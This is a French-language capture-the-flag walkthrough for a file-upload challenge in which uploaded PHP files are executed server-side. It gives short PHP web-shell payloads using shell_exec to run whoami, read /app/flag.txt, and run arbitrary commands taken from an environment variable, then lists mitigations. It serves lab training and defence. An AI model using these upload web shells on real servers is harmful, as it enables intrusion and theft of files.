# Upload — Guide de résolution

## Contexte du challenge
Le serveur accepte plusieurs extensions et propose un « aperçu » selon le type de fichier. Particularités importantes:
- Extensions autorisées: png, jpg, jpeg, gif, svg, txt, log, md, html, htm, php.
- Pour les fichiers .php, le backend exécute le script avec php-cli (ligne de commande), capture stdout/stderr et affiche le résultat dans un bloc « Sortie PHP ».
- Il n’y a PAS de serveur web PHP: pas de Apache/nginx, pas de php-fpm. Donc pas de contexte HTTP côté PHP.
	- Conséquence: `$_GET`, `$_POST`, `$_SERVER` n’ont pas les valeurs habituelles; un paramètre `?cmd=` dans l’URL n’est pas transmis au processus CLI.
	- Le HTML émis par le script est affiché comme du texte (dans un `<pre>`), il n’est pas « rendu » en tant que page interactive.

## Objectif
Exécuter une commande côté serveur pour lire le flag monté dans le conteneur (chemin: `/app/flag.txt`).

## Étapes rapides
1) Créez un fichier `shell.php` avec un payload CLI simple, par exemple:
```php
<?php echo shell_exec('whoami 2>&1');
```
Téléversez-le, puis ouvrez l’URL d’aperçu: `/uploads/shell.php`. Vous devriez voir « Sortie PHP (code 0) » suivie du résultat.

2) Lisez le flag:
```php
<?php echo shell_exec('cat /app/flag.txt 2>&1');
```
Upload → ouvrez `/uploads/<votre_fichier>.php` → la sortie doit afficher `CTF{...}`.

## Variantes et astuces
- Timeout: l’exécution PHP est limitée à ~5s. Évitez les commandes longues/bloquantes.
- Binaries disponibles: l’image est minimale. Certaines commandes (ex: `ping`, `ifconfig`) peuvent être absentes.
- Noms avec espaces/accents: l’interface encode l’URL automatiquement; les liens devraient fonctionner (ex: `Capture d’écran.png`).
- Si vous tenez à un « web shell » interactif: utilisez des sources compatibles CLI (argv/env). Exemple:
	```php
	<?php $cmd = getenv('CMD') ?: 'id'; echo shell_exec($cmd.' 2>&1');
	```
	(Par défaut, l’application ne transmet pas de variables au process PHP.)

## Mitigations (hors CTF)
- Ne jamais exécuter le contenu téléversé. Servez les fichiers en statique et/ou via un CDN.
- Restreindre strictement les extensions, vérifier le type MIME, renommer/sandboxer.
- Isoler l’espace de stockage (permissions, chroot/jail) et désactiver l’exécution.